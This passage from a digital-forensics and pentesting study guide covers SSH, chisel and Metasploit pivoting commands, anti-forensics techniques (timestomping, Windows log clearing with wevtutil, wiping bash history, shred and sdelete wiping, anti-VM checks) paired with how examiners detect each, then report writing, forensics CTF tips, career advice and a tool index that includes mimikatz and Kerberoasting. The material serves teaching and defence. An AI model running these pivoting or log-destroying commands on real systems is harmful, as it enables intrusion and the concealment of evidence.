## 16. Pivoting & Lateral Movement (Expanded)

### Detection-Aware Pivoting Techniques

```bash
# ── SSH TUNNELING — three flavors ────────────────────────────────
# Local forward: reach an internal service through the compromised box
ssh -L 8080:internal-db:3306 user@pivot-host
# Now localhost:8080 on YOUR machine reaches internal-db:3306

# Remote forward: expose YOUR service back through to the target
# network (useful for staging a payload an internal host can reach)
ssh -R 9001:localhost:80 user@pivot-host

# Dynamic (SOCKS proxy) — route ARBITRARY tools through the pivot
ssh -D 1080 user@pivot-host
echo "socks5 127.0.0.1 1080" | sudo tee -a /etc/proxychains4.conf
proxychains nmap -sT -Pn 10.0.0.0/24    # -sT required: SOCKS can't
                                          # carry raw SYN scans, only
                                          # full TCP connects

# ── CHISEL — works through restrictive outbound-only firewalls ─────
# (HTTP-tunneled SOCKS proxy, useful when raw SSH is blocked outbound
# but HTTP/S is allowed)
# On your attack box (server):
./chisel server -p 8000 --reverse
# On the pivot host (client, connects OUT to you):
./chisel client your-ip:8000 R:socks
# Configure proxychains to use 127.0.0.1:1080 same as above.

# ── METASPLOIT ROUTING ────────────────────────────────────────────
# Inside an active meterpreter session:
run autoroute -s 10.0.0.0/24
use auxiliary/server/socks_proxy
set SRVPORT 1080
run
# Now external tools via proxychains can reach the 10.0.0.0/24
# network entirely through the compromised host's meterpreter session.
```

### How Defenders/Examiners Detect Pivoting (Flip Side)

```
For forensic reconstruction, pivoting leaves specific traces:
  - SSH dynamic/local/remote forwards show in auth.log/journalctl as
    normal SSH sessions, but UNUSUAL outbound connection patterns from
    the pivot host immediately follow (the pivot host suddenly talking
    to many internal IPs it never contacted before)
  - Chisel/ngrok-style tunnels generate distinctive long-lived outbound
    HTTP/S connections with regular keepalive traffic — check
    connection DURATION in conn.log/netflow, legitimate browsing
    rarely holds one connection open for hours
  - Metasploit's socks_proxy module, if default-configured, listens
    on a predictable port and the meterpreter session itself shows up
    as an unusual outbound TCP connection from the compromised host to
    the attacker's infrastructure with characteristic beaconing
```

---

## 17. Anti-Forensics & Covering Tracks (and How Examiners Detect It)

> This section is presented paired — technique alongside detection — because as a future
> examiner, your job is specifically to catch these, and understanding the attacker's full toolkit
> is what lets you do that.

### Timestomping

```
ATTACKER TECHNIQUE:
  timestomp file.txt -m "01/01/2020 12:00:00"   (Meterpreter)
  Or via PowerShell: (Get-Item file.txt).LastWriteTime = "01/01/2020"
  These modify $STANDARD_INFORMATION timestamps to make a malicious
  file blend in with old, legitimate system files.

EXAMINER DETECTION:
  Compare $STANDARD_INFORMATION vs $FILE_NAME timestamps (Section 6).
  Most timestomping tools only touch SI, not FN — a mismatch is the tell.
  Also check $LogFile/$UsnJrnl — these independent journals often
  retain the TRUE original creation event even after SI is altered,
  since the journal entry was written at the time of the real event,
  before any tampering occurred.
```

### Log Clearing

```
ATTACKER TECHNIQUE:
  wevtutil cl Security    (Windows)
  history -c; > ~/.bash_history    (Linux)

EXAMINER DETECTION:
  Windows: clearing the Security log ITSELF generates Event ID 1102
  ("The audit log was cleared") — this event is recorded in the very
  log being cleared, so it survives the clear operation. A gap in
  Security log coverage, bookended by a 1102 event, is essentially a
  confession that something was being hidden in that window — pivot to
  OTHER log sources (Sysmon, application logs, network logs, the
  $UsnJrnl on disk) to fill the gap.

  Linux: `history -c` only clears the IN-MEMORY history for the
  current shell — it does NOT touch:
    - The in-memory readline buffer of an ALREADY-RUNNING shell
      session, recoverable via memory forensics (linux.bash.Bash plugin)
    - auditd logs, if execve auditing was configured
    - Any centralized/forwarded syslog (if logs were shipped off-box
      before being cleared locally, the off-box copy survives untouched)
    - Shell history of OTHER terminal sessions open at the same time
```

### Wiping / Secure Deletion

```
ATTACKER TECHNIQUE:
  shred -vfz -n 7 sensitive_file
  sdelete -p 7 file.txt    (Windows, Sysinternals)
  Multiple-pass overwrite intended to make recovery impossible.

EXAMINER DETECTION/LIMITATION (be honest about this one):
  On a traditional spinning HDD, properly executed multi-pass wiping
  IS genuinely very hard to recover from — don't overclaim recoverability
  to an investigator. What CAN still help:
    - $MFT/USN Journal entries may still show the file EXISTED and WAS
      DELETED, with original filename/size/timestamps, even though
      content is gone — proves existence and intent even without content.
    - Slack space in adjacent clusters may retain fragments if the
      wipe tool didn't account for filesystem-level slack.
    - On SSDs specifically, wear-leveling means the physical NAND
      cells the OS thinks it wrote to may NOT be the ones actually
      holding old data — TRIM command behavior varies, and in some
      configurations, SSD over-provisioned space can retain remnants
      the OS itself can no longer address. This cuts both ways: it can
      mean recovery is sometimes MORE possible than expected (data
      "deleted" by TRIM not actually erased yet) or less (TRIM having
      already proactively erased blocks before you even seized the drive).
    - If a backup/Volume Shadow Copy/cloud sync existed BEFORE the wipe,
      that copy may be unaffected by local wiping entirely.
```

### Anti-Virtual-Machine / Anti-Sandbox Techniques (Malware Side)

```
MALWARE TECHNIQUE:
  Checks for VM-specific artifacts before executing payload:
    - CPUID hypervisor bit
    - VM-specific MAC address OUI prefixes (VMware: 00:0C:29, 00:50:56;
      VirtualBox: 08:00:27)
    - Registry keys: HKLM\HARDWARE\Description\System\
      "SystemBiosVersion" containing "VBOX" or "VMWARE"
    - Small disk size, low core count, low RAM (real victim machines
      rarely have <2 cores/<2GB RAM in modern environments)
    - Sleep/timing checks (sandboxes often fast-forward or have
      execution time limits; malware sleeps longer than the sandbox's
      patience, then executes after the sandbox has already produced
      its "clean" report)

ANALYST COUNTERMEASURE:
  - Configure your analysis VM to mask these specifics: spoof MAC OUI,
    patch out telltale registry strings, allocate realistic resources
  - Use longer sandbox observation windows, or patch out sleep calls
    in a debugger before letting the sample run
  - Tools like al-khaser test a VM's own anti-detection posture —
    useful to validate your analysis environment isn't trivially
    fingerprinted before you rely on it for real samples
```

---

## 18. Report Writing — Court-Ready & Pentest-Ready (Expanded)

### Forensic Report Structure (Court-Ready)

```
1. CASE INFORMATION
   Case/reference number, examiner name & qualifications, date of
   report, evidence items examined (with serial/ID numbers)

2. SUMMARY OF FINDINGS
   Plain-language summary suitable for a non-technical reader
   (investigator, attorney, judge) — what was found, in what order,
   without jargon. This section gets read most carefully; write it last,
   after you know exactly what you're summarizing.

3. METHODOLOGY
   Exact tools + versions used, acquisition method, validation steps
   taken. Specific enough that another examiner could REPRODUCE your
   process and verify your findings independently — this is the
   Daubert-standard reproducibility requirement in practice.

4. DETAILED FINDINGS
   For each piece of evidence:
     - Where it was found (exact path/location/offset)
     - How it was found (exact tool/command/technique)
     - What it shows (objective description first, interpretation
       clearly labeled as interpretation second)
     - Supporting screenshots/exports referenced by exhibit number

5. CHAIN OF CUSTODY
   Reference to the full custody log (Section 1), or embed it directly.

6. LIMITATIONS
   Be explicit about what you could NOT determine, what tools/access
   you didn't have, and any uncertainty in your conclusions. Omitting
   limitations is a credibility risk under cross-examination — an
   examiner who proactively states "I could not recover X because Y"
   is far more credible than one who appears to claim certainty they
   don't actually have.

7. EXAMINER QUALIFICATIONS
   Training, certifications, relevant experience — establishes
   standing to offer the analysis as expert opinion if needed.

8. APPENDICES
   Full tool output, hash logs, raw command history.
```

### The Critical Discipline: Fact vs Interpretation

```
WEAK (blends fact and conclusion):
  "The suspect deleted the incriminating file to hide evidence."

STRONG (separates them explicitly):
  FACT: "File 'financials.xlsx' (MFT entry 4521) was marked deleted at
         [timestamp] per $LogFile entry #88231. The $STANDARD_INFORMATION
         modified timestamp was [timestamp2], approximately 3 minutes
         after a failed login attempt was recorded for this same
         account in the Security event log (Event ID 4625, [timestamp3])."
  INTERPRETATION: "This temporal proximity is consistent with, but does
         not conclusively prove, the file deletion being connected to
         the failed login event. Alternative explanations include [...]."

This discipline — stating the fact, then EXPLICITLY labeling your
interpretation as interpretation, including alternative explanations —
is what separates expert forensic testimony that survives
cross-examination from testimony that gets torn apart.
```

### Pentest Report Structure (Business-Facing)

```
1. EXECUTIVE SUMMARY    — for leadership, plain language, business risk
2. SCOPE & METHODOLOGY   — what was tested, how, when
3. RISK SUMMARY TABLE     — finding, severity (CVSS), affected asset
4. DETAILED FINDINGS        — per the format in the original guide
   (title, severity, location, description, impact, evidence,
   recommendation, references — map to relevant CWE/CVE/MITRE ATT&CK
   technique IDs where applicable)
5. REMEDIATION ROADMAP        — prioritized by risk × effort, not just
                                 severity alone (a critical finding
                                 that takes 6 months to fix needs an
                                 interim mitigation noted too)
6. APPENDIX                    — raw scan output, tool versions
```

---

## 19. CTF Strategy (Expanded — Forensics-Specific)

### Forensics CTF Category — Common Challenge Patterns

```
"Find the flag in this pcap"
  → Start with: tshark statistics, then export HTTP objects, then
    check DNS queries for base64-encoded data (DNS tunneling is a
    common CTF trick), then check for unusual ports.

"Find the flag in this memory dump"
  → vol -f mem.dmp windows.pslist (look for an odd process), then
    malfind, then dump and strings the suspicious process, then check
    cmdline for an obviously CTF-flag-bearing argument.

"Find the flag in this disk image"
  → fls -rd for deleted files first (CTFs love hiding flags in
    deleted files), then foremost/photorec carving, then check slack
    space, then check alternate data streams (NTFS):
    dir /r on the mounted image reveals ADS; or via Sleuth Kit, ADS
    show as separate streams in fls output.

"Steganography — find the flag in this image"
  → exiftool first (sometimes it's just in metadata, the "free win"),
    then:
    steghide extract -sf image.jpg              # try with no passphrase
    zsteg image.png                              # LSB steganography
                                                   # detection (PNG/BMP)
    binwalk -e image.jpg                          # check for an
                                                   # embedded file
                                                   # appended after the
                                                   # JPEG's actual end
                                                   # marker (very common
                                                   # CTF trick — JPEG
                                                   # viewers ignore
                                                   # trailing data)
    strings image.jpg | tail -50                   # flag sometimes
                                                    # just appended as text

"Find the flag in this weird file format"
  → file unknownfile.bin   (start here always)
    binwalk unknownfile.bin (check for embedded/appended structures)
    xxd unknownfile.bin | head  (check magic bytes manually if `file`
                                   doesn't recognize it — CTFs sometimes
                                   use deliberately corrupted headers
                                   you need to manually repair)
```

---

## 20. Career Roadmap — Police Forensics Track (Expanded)

### Pathways Into Law-Enforcement-Adjacent Digital Forensics

```
DIRECT EMPLOYMENT
  Many police departments/national agencies have dedicated digital/
  cyber forensics units (sometimes called Cyber Crime Unit, Digital
  Forensics Unit). Entry often requires either:
    - A relevant degree (you're positioned well here) + certifications, or
    - Lateral entry from IT/sworn-officer background with forensics
      training provided internally
  Research your specific country/region's structure — in Bangladesh
  specifically, look into the Police Cyber Support for Women unit,
  CID's Cyber Crime Investigation Division, and the Bangladesh
  Computer Council/BGD e-GOV CIRT for relevant pathways and training
  programs; requirements and unit names do change, so verify current
  details directly with the agency rather than relying on older info.

CIVILIAN CONTRACTOR / CONSULTANT
  Many agencies contract out digital forensics to accredited private
  labs or individual certified examiners for casework — a path that
  doesn't require becoming a sworn officer.

ACADEMIC/RESEARCH BRIDGE
  Published research or conference presentations in digital forensics
  (even student-level CTF writeups demonstrating methodology) can be a
  credibility-building stepping stone, and some agencies specifically
  recruit from university cybersecurity programs via internship pipelines.

CERTIFICATIONS WITH SPECIFIC LE/COURT CREDIBILITY
  GCFE (GIAC Certified Forensic Examiner)     → broad, well-regarded
  GCFA (GIAC Certified Forensic Analyst)       → more advanced, incident-
                                                  response-oriented
  CHFI (EC-Council)                             → widely recognized,
                                                  good foundational credential
  EnCE (EnCase Certified Examiner)               → tied to EnCase tool
                                                  specifically, still
                                                  common in many LE labs
  CFCE (Certified Forensic Computer Examiner,
        IACIS)                                    → specifically
                                                  LE-oriented, well
                                                  regarded among
                                                  practicing examiners
```

### Building a Portfolio That Demonstrates This Specific Skillset

```
1. Complete forensics-focused CTF challenges and write DETAILED,
   methodology-first writeups (not just "I ran tool X and got the
   flag" — show the reasoning, alternative approaches considered,
   what didn't work and why).
2. Build a home lab demonstrating end-to-end case handling: seize
   (simulate) → image → hash/verify → analyze → report, using your own
   test VMs with planted evidence, to practice the FULL workflow
   including the chain-of-custody paperwork, not just the technical
   analysis.
3. Practice on legitimately-sourced practice images: DFIR.training's
   public CTF archive, the NIST CFReDS (Computer Forensic Reference
   Data Sets) project, and the "Digital Corpora" project all provide
   legally-clean, purpose-built practice disk/memory images.
4. Document your MERN security lab work (which you already have) as
   a demonstrated understanding of the developer side of vulnerabilities
   — useful framing for forensics roles investigating web-application-
   based intrusions, since you can speak to both how the attack worked
   AND how the code should have prevented it.
```

---

## Quick Reference — Full Tool Index

```bash
# ═══════════════════ DISK FORENSICS ═══════════════════
dc3dd / dcfldd / ewfacquire    # forensic imaging with built-in hashing
ewfverify                       # verify E01 image integrity
hashdeep -r -c sha256 dir/      # recursive hash a directory tree
fls / istat / icat / tsk_recover # Sleuth Kit file listing/extraction
blkls / blkstat / blkcat        # block-level slack/unallocated analysis
foremost / scalpel               # signature-based file carving
bulk_extractor                    # smart carving + email/CCN/EXIF scanners
photorec / testdisk                # fragmented file & partition recovery
MFTECmd (mono)                      # parse $MFT to CSV
extundelete                          # EXT4 deleted file recovery

# ═══════════════════ MEMORY FORENSICS ═══════════════════
LiME                            # Linux kernel module RAM capture
WinPmem / Belkasoft RAM Capturer # Windows RAM capture
vol -f mem.dmp windows.pslist / psscan / pstree   # process listing/hidden detection
vol -f mem.dmp windows.malfind   # injected code detection
vol -f mem.dmp windows.netscan   # network connections
vol -f mem.dmp windows.hashdump  # credential extraction
vol -f mem.dmp windows.cmdline   # process command lines
vol -f mem.dmp linux.bash.Bash    # recover bash history from memory

# ═══════════════════ NETWORK FORENSICS ═══════════════════
tcpdump -s 0 -w capture.pcap     # full packet capture
tshark -r cap.pcap -Y "filter"    # CLI filtering/extraction
zeek -r cap.pcap                   # automated structured log generation
suricata -r cap.pcap -c config.yaml # signature-based detection on pcap
NetworkMiner                         # per-host passive reconstruction

# ═══════════════════ FILE SYSTEM / REGISTRY ═══════════════════
reglookup / RegistryExplorer (mono) # registry hive parsing
EvtxECmd (mono) / evtx_dump.py       # Windows event log parsing
log2timeline.py + psort.py (plaso)    # supertimeline generation across
                                        # all artifact types

# ═══════════════════ MOBILE FORENSICS ═══════════════════
adb backup / adb pull              # Android logical/file acquisition
sqlite_dissect                      # SQLite deep parsing incl. deleted rows
wadecrypt                            # WhatsApp database decryption
mvt-android / mvt-ios                 # spyware/stalkerware indicator scanning

# ═══════════════════ MALWARE FORENSICS ═══════════════════
pefile / pev / peheader              # PE structure analysis
yara -r rules.yar target/             # pattern matching at scale
Ghidra / radare2                       # disassembly/decompilation
olevba / mraptor / oleid                # Office macro malware analysis
peepdf                                   # PDF exploit/JS analysis
fakenet-ng                                # simulated internet for dynamic analysis
Procmon / Regshot                          # Windows behavioral monitoring (in VM)

# ═══════════════════ EMAIL FORENSICS ═══════════════════
grep "Authentication-Results" email.eml   # SPF/DKIM/DMARC check
exiftool attachment.pdf                     # attachment metadata

# ═══════════════════ RECON / OSINT ═══════════════════
sherlock / holehe                  # username/email platform pivoting
theHarvester -d target.com -b all  # email/subdomain aggregation
shodan search "query"               # internet-wide device search
subfinder / amass / assetfinder       # subdomain enumeration (combine all 3)
httpx -silent -status-code           # validate live subdomains

# ═══════════════════ EXPLOITATION ═══════════════════
sqlmap -u "url" --batch --dbs        # automated SQLi
Burp Suite                            # web proxy/manipulation/fuzzing
ysoserial                              # Java deserialization payloads
GetUserSPNs.py / GetNPUsers.py          # Kerberoast / AS-REP roast
hashcat -m <mode> hashes.txt wordlist   # offline hash cracking
ROPgadget --binary file --ropchain       # ROP chain construction (pwn)

# ═══════════════════ POST-EXPLOITATION ═══════════════════
winPEAS / linpeas.sh                  # automated privesc enumeration
GTFOBins (reference site)              # SUID/sudo/capability escape lookups
mimikatz                                # Windows credential extraction
BloodHound + SharpHound                  # AD attack path mapping

# ═══════════════════ PIVOTING ═══════════════════
ssh -L / -R / -D                      # tunneling (local/remote/SOCKS)
chisel                                  # HTTP-tunneled pivoting through
                                          # restrictive firewalls
proxychains                              # route arbitrary tools through
                                          # a SOCKS pivot
```

---

_This expanded guide adds legal/court-readiness context, deeper internals (NTFS/EXT4/memory
structures), a much larger tool index, and paired attacker-technique/examiner-detection sections —
built on top of the original mastery guide's structure and career roadmap._

_Stay ethical, stay legal, document everything, and remember: in forensics, the strength of your
conclusion is only as strong as your weakest unexplained gap in the evidence chain._ 🛡️
